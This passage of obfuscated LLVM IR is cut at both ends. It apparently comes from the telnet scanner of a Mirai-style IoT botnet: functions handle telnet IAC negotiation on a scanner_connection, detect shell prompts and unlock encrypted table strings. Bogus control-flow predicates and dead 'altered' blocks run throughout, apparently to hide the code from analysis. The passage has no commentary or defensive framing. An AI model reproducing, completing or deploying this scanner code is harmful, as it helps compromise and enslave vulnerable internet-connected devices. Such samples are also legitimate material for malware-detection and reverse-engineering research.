  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %49
  %58 = load i8*, i8** %6, align 8
  %59 = load i32, i32* %10, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %58, i64 %60
  store i8 65, i8* %61, align 1
  %62 = load i32, i32* @x.63
  %63 = load i32, i32* @y.64
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %70

; <label>:70:                                     ; preds = %originalBBpart24, %originalBBpart2
  br label %71

; <label>:71:                                     ; preds = %70
  %72 = load i32, i32* @x.63
  %73 = load i32, i32* @y.64
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %71
  %80 = load i32, i32* %10, align 4
  %81 = add nsw i32 %80, 1
  store i32 %81, i32* %10, align 4
  %82 = load i32, i32* @x.63
  %83 = load i32, i32* @y.64
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart223, label %originalBB6alteredBB

originalBBpart223:                                ; preds = %originalBB6
  br label %21

; <label>:90:                                     ; preds = %21
  %91 = load i32, i32* @x.63
  %92 = load i32, i32* @y.64
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %90
  %99 = load i32, i32* @x.63
  %100 = load i32, i32* @y.64
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %107

; <label>:107:                                    ; preds = %originalBBpart227, %4
  %108 = load i32, i32* %9, align 4
  ret i32 %108

originalBBalteredBB:                              ; preds = %originalBB, %25
  %109 = load i8*, i8** %6, align 8
  %110 = load i32, i32* %10, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds i8, i8* %109, i64 %111
  %113 = load i8, i8* %112, align 1
  %114 = sext i8 %113 to i32
  %115 = icmp eq i32 %114, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %49
  %116 = load i8*, i8** %6, align 8
  %117 = load i32, i32* %10, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8, i8* %116, i64 %118
  store i8 65, i8* %119, align 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %71
  %120 = load i32, i32* %10, align 4
  %_ = sub i32 0, %120
  %gen = add i32 %_, 1
  %_7 = sub i32 %120, 1
  %gen8 = mul i32 %_7, 1
  %_9 = sub i32 %120, 1
  %gen10 = mul i32 %_9, 1
  %_11 = sub i32 %120, 1
  %gen12 = mul i32 %_11, 1
  %_13 = sub i32 %120, 1
  %gen14 = mul i32 %_13, 1
  %_15 = sub i32 0, %120
  %gen16 = add i32 %_15, 1
  %_17 = shl i32 %120, 1
  %_18 = sub i32 %120, 1
  %gen19 = mul i32 %_18, 1
  %_20 = sub i32 0, %120
  %gen21 = add i32 %_20, 1
  %121 = add nsw i32 %120, 1
  store i32 %121, i32* %10, align 4
  br label %originalBB6

originalBB25alteredBB:                            ; preds = %originalBB25, %90
  br label %originalBB25
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_iacs(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  br label %11

; <label>:11:                                     ; preds = %264, %88, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 6
  %15 = load i32, i32* %14, align 4
  %16 = icmp slt i32 %12, %15
  br i1 %16, label %17, label %265

; <label>:17:                                     ; preds = %11
  %18 = load i8*, i8** %4, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 255
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %17
  br label %265

; <label>:23:                                     ; preds = %17
  %24 = load i8*, i8** %4, align 8
  %25 = load i8, i8* %24, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 255
  br i1 %27, label %28, label %247

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @x.65
  %30 = load i32, i32* @y.66
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %28
  %37 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %38 = load i8*, i8** %4, align 8
  %39 = call signext i8 @can_consume(%struct.scanner_connection* %37, i8* %38, i32 1)
  %40 = icmp ne i8 %39, 0
  %41 = load i32, i32* @x.65
  %42 = load i32, i32* @y.66
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %40, label %66, label %49

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = load i32, i32* @x.65
  %51 = load i32, i32* @y.66
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %49
  %58 = load i32, i32* @x.65
  %59 = load i32, i32* @y.66
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %265

; <label>:66:                                     ; preds = %originalBBpart2
  %67 = load i32, i32* @x.65
  %68 = load i32, i32* @y.66
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %66
  %75 = load i8*, i8** %4, align 8
  %76 = getelementptr inbounds i8, i8* %75, i64 1
  %77 = load i8, i8* %76, align 1
  %78 = zext i8 %77 to i32
  %79 = icmp eq i32 %78, 255
  %80 = load i32, i32* @x.65
  %81 = load i32, i32* @y.66
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %79, label %88, label %93

; <label>:88:                                     ; preds = %originalBBpart28
  %89 = load i8*, i8** %4, align 8
  %90 = getelementptr inbounds i8, i8* %89, i64 2
  store i8* %90, i8** %4, align 8
  %91 = load i32, i32* %3, align 4
  %92 = add nsw i32 %91, 2
  store i32 %92, i32* %3, align 4
  br label %11

; <label>:93:                                     ; preds = %originalBBpart28
  %94 = load i8*, i8** %4, align 8
  %95 = getelementptr inbounds i8, i8* %94, i64 1
  %96 = load i8, i8* %95, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp eq i32 %97, 253
  br i1 %98, label %99, label %129

; <label>:99:                                     ; preds = %93
  %100 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %100, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %101 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %101, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %102 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %103 = load i8*, i8** %4, align 8
  %104 = call signext i8 @can_consume(%struct.scanner_connection* %102, i8* %103, i32 2)
  %105 = icmp ne i8 %104, 0
  br i1 %105, label %107, label %106

; <label>:106:                                    ; preds = %99
  br label %265

; <label>:107:                                    ; preds = %99
  %108 = load i8*, i8** %4, align 8
  %109 = getelementptr inbounds i8, i8* %108, i64 2
  %110 = load i8, i8* %109, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp ne i32 %111, 31
  br i1 %112, label %113, label %114

; <label>:113:                                    ; preds = %107
  br label %130

; <label>:114:                                    ; preds = %107
  %115 = load i8*, i8** %4, align 8
  %116 = getelementptr inbounds i8, i8* %115, i64 3
  store i8* %116, i8** %4, align 8
  %117 = load i32, i32* %3, align 4
  %118 = add nsw i32 %117, 3
  store i32 %118, i32* %3, align 4
  %119 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %120 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %119, i32 0, i32 1
  %121 = load i32, i32* %120, align 8
  %122 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %123 = call i64 @send(i32 %121, i8* %122, i64 3, i32 16384)
  %124 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %125 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %124, i32 0, i32 1
  %126 = load i32, i32* %125, align 8
  %127 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %128 = call i64 @send(i32 %126, i8* %127, i64 9, i32 16384)
  br label %229

; <label>:129:                                    ; preds = %93
  br label %130

; <label>:130:                                    ; preds = %129, %113
  %131 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %132 = load i8*, i8** %4, align 8
  %133 = call signext i8 @can_consume(%struct.scanner_connection* %131, i8* %132, i32 2)
  %134 = icmp ne i8 %133, 0
  br i1 %134, label %136, label %135

; <label>:135:                                    ; preds = %130
  br label %265

; <label>:136:                                    ; preds = %130
  store i32 0, i32* %5, align 4
  br label %137

; <label>:137:                                    ; preds = %216, %136
  %138 = load i32, i32* %5, align 4
  %139 = icmp slt i32 %138, 3
  br i1 %139, label %140, label %219

; <label>:140:                                    ; preds = %137
  %141 = load i32, i32* @x.65
  %142 = load i32, i32* @y.66
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %140
  %149 = load i8*, i8** %4, align 8
  %150 = load i32, i32* %5, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds i8, i8* %149, i64 %151
  %153 = load i8, i8* %152, align 1
  %154 = zext i8 %153 to i32
  %155 = icmp eq i32 %154, 253
  %156 = load i32, i32* @x.65
  %157 = load i32, i32* @y.66
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %155, label %164, label %169

; <label>:164:                                    ; preds = %originalBBpart212
  %165 = load i8*, i8** %4, align 8
  %166 = load i32, i32* %5, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds i8, i8* %165, i64 %167
  store i8 -4, i8* %168, align 1
  br label %215

; <label>:169:                                    ; preds = %originalBBpart212
  %170 = load i8*, i8** %4, align 8
  %171 = load i32, i32* %5, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds i8, i8* %170, i64 %172
  %174 = load i8, i8* %173, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp eq i32 %175, 251
  br i1 %176, label %177, label %198

; <label>:177:                                    ; preds = %169
  %178 = load i32, i32* @x.65
  %179 = load i32, i32* @y.66
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %177
  %186 = load i8*, i8** %4, align 8
  %187 = load i32, i32* %5, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds i8, i8* %186, i64 %188
  store i8 -3, i8* %189, align 1
  %190 = load i32, i32* @x.65
  %191 = load i32, i32* @y.66
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %198

; <label>:198:                                    ; preds = %originalBBpart216, %169
  %199 = load i32, i32* @x.65
  %200 = load i32, i32* @y.66
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %198
  %207 = load i32, i32* @x.65
  %208 = load i32, i32* @y.66
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %215

; <label>:215:                                    ; preds = %originalBBpart220, %164
  br label %216

; <label>:216:                                    ; preds = %215
  %217 = load i32, i32* %5, align 4
  %218 = add nsw i32 %217, 1
  store i32 %218, i32* %5, align 4
  br label %137

; <label>:219:                                    ; preds = %137
  %220 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %221 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %220, i32 0, i32 1
  %222 = load i32, i32* %221, align 8
  %223 = load i8*, i8** %4, align 8
  %224 = call i64 @send(i32 %222, i8* %223, i64 3, i32 16384)
  %225 = load i8*, i8** %4, align 8
  %226 = getelementptr inbounds i8, i8* %225, i64 3
  store i8* %226, i8** %4, align 8
  %227 = load i32, i32* %3, align 4
  %228 = add nsw i32 %227, 3
  store i32 %228, i32* %3, align 4
  br label %229

; <label>:229:                                    ; preds = %219, %114
  %230 = load i32, i32* @x.65
  %231 = load i32, i32* @y.66
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %229
  %238 = load i32, i32* @x.65
  %239 = load i32, i32* @y.66
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %246

; <label>:246:                                    ; preds = %originalBBpart224
  br label %247

; <label>:247:                                    ; preds = %246, %23
  %248 = load i32, i32* @x.65
  %249 = load i32, i32* @y.66
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %247
  %256 = load i32, i32* @x.65
  %257 = load i32, i32* @y.66
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %264

; <label>:264:                                    ; preds = %originalBBpart228
  br label %11

; <label>:265:                                    ; preds = %135, %106, %originalBBpart24, %22, %11
  %266 = load i32, i32* %3, align 4
  ret i32 %266

originalBBalteredBB:                              ; preds = %originalBB, %28
  %267 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %268 = load i8*, i8** %4, align 8
  %269 = call signext i8 @can_consume(%struct.scanner_connection* %267, i8* %268, i32 1)
  %270 = icmp ne i8 %269, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %49
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %66
  %271 = load i8*, i8** %4, align 8
  %272 = getelementptr inbounds i8, i8* %271, i64 1
  %273 = load i8, i8* %272, align 1
  %274 = zext i8 %273 to i32
  %275 = icmp eq i32 %274, 255
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %140
  %276 = load i8*, i8** %4, align 8
  %277 = load i32, i32* %5, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds i8, i8* %276, i64 %278
  %280 = load i8, i8* %279, align 1
  %281 = zext i8 %280 to i32
  %282 = icmp eq i32 %281, 253
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %177
  %283 = load i8*, i8** %4, align 8
  %284 = load i32, i32* %5, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds i8, i8* %283, i64 %285
  store i8 -3, i8* %286, align 1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %198
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %229
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %247
  br label %originalBB26
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_user_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sub nsw i32 %13, 1
  store i32 %14, i32* %5, align 4
  br label %15

; <label>:15:                                     ; preds = %115, %1
  %16 = load i32, i32* %5, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %18, label %118

; <label>:18:                                     ; preds = %15
  %19 = load i32, i32* @x.67
  %20 = load i32, i32* @y.68
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 7
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [256 x i8], [256 x i8]* %28, i64 0, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 58
  %35 = load i32, i32* @x.67
  %36 = load i32, i32* @y.68
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %95, label %43

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %45 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %44, i32 0, i32 7
  %46 = load i32, i32* %5, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [256 x i8], [256 x i8]* %45, i64 0, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp eq i32 %50, 62
  br i1 %51, label %95, label %52

; <label>:52:                                     ; preds = %43
  %53 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %54 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %53, i32 0, i32 7
  %55 = load i32, i32* %5, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %54, i64 0, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = sext i8 %58 to i32
  %60 = icmp eq i32 %59, 36
  br i1 %60, label %95, label %61

; <label>:61:                                     ; preds = %52
  %62 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %63 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %62, i32 0, i32 7
  %64 = load i32, i32* %5, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [256 x i8], [256 x i8]* %63, i64 0, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 35
  br i1 %69, label %95, label %70

; <label>:70:                                     ; preds = %61
  %71 = load i32, i32* @x.67
  %72 = load i32, i32* @y.68
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %70
  %79 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %80 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %79, i32 0, i32 7
  %81 = load i32, i32* %5, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds [256 x i8], [256 x i8]* %80, i64 0, i64 %82
  %84 = load i8, i8* %83, align 1
  %85 = sext i8 %84 to i32
  %86 = icmp eq i32 %85, 37
  %87 = load i32, i32* @x.67
  %88 = load i32, i32* @y.68
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %86, label %95, label %114

; <label>:95:                                     ; preds = %originalBBpart24, %61, %52, %43, %originalBBpart2
  %96 = load i32, i32* @x.67
  %97 = load i32, i32* @y.68
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %95
  %104 = load i32, i32* %5, align 4
  %105 = add nsw i32 %104, 1
  store i32 %105, i32* %6, align 4
  %106 = load i32, i32* @x.67
  %107 = load i32, i32* @y.68
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart219, label %originalBB6alteredBB

originalBBpart219:                                ; preds = %originalBB6
  br label %118

; <label>:114:                                    ; preds = %originalBBpart24
  br label %115

; <label>:115:                                    ; preds = %114
  %116 = load i32, i32* %5, align 4
  %117 = add nsw i32 %116, -1
  store i32 %117, i32* %5, align 4
  br label %15

; <label>:118:                                    ; preds = %originalBBpart219, %15
  %119 = load i32, i32* %6, align 4
  %120 = icmp eq i32 %119, -1
  br i1 %120, label %121, label %203

; <label>:121:                                    ; preds = %118
  call void @table_unlock_val(i8 zeroext 26)
  call void @table_unlock_val(i8 zeroext 27)
  %122 = call i8* @table_retrieve_val(i32 26, i32* %8)
  store i8* %122, i8** %9, align 8
  %123 = call i8* @table_retrieve_val(i32 27, i32* %8)
  store i8* %123, i8** %10, align 8
  %124 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %125 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %124, i32 0, i32 7
  %126 = getelementptr inbounds [256 x i8], [256 x i8]* %125, i32 0, i32 0
  %127 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %128 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %127, i32 0, i32 6
  %129 = load i32, i32* %128, align 4
  %130 = load i8*, i8** %9, align 8
  %131 = load i32, i32* %8, align 4
  %132 = sub nsw i32 %131, 1
  %133 = call i32 @util_memsearch(i8* %126, i32 %129, i8* %130, i32 %132)
  %134 = icmp ne i32 %133, -1
  %135 = zext i1 %134 to i32
  store i32 %135, i32* %7, align 4
  br i1 %134, label %136, label %154

; <label>:136:                                    ; preds = %121
  %137 = load i32, i32* @x.67
  %138 = load i32, i32* @y.68
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %136
  %145 = load i32, i32* %7, align 4
  store i32 %145, i32* %6, align 4
  %146 = load i32, i32* @x.67
  %147 = load i32, i32* @y.68
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %202

; <label>:154:                                    ; preds = %121
  %155 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %156 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %155, i32 0, i32 7
  %157 = getelementptr inbounds [256 x i8], [256 x i8]* %156, i32 0, i32 0
  %158 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %159 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %158, i32 0, i32 6
  %160 = load i32, i32* %159, align 4
  %161 = load i8*, i8** %10, align 8
  %162 = load i32, i32* %8, align 4
  %163 = sub nsw i32 %162, 1
  %164 = call i32 @util_memsearch(i8* %157, i32 %160, i8* %161, i32 %163)
  %165 = icmp ne i32 %164, -1
  %166 = zext i1 %165 to i32
  store i32 %166, i32* %7, align 4
  br i1 %165, label %167, label %185

; <label>:167:                                    ; preds = %154
  %168 = load i32, i32* @x.67
  %169 = load i32, i32* @y.68
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %167
  %176 = load i32, i32* %7, align 4
  store i32 %176, i32* %6, align 4
  %177 = load i32, i32* @x.67
  %178 = load i32, i32* @y.68
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
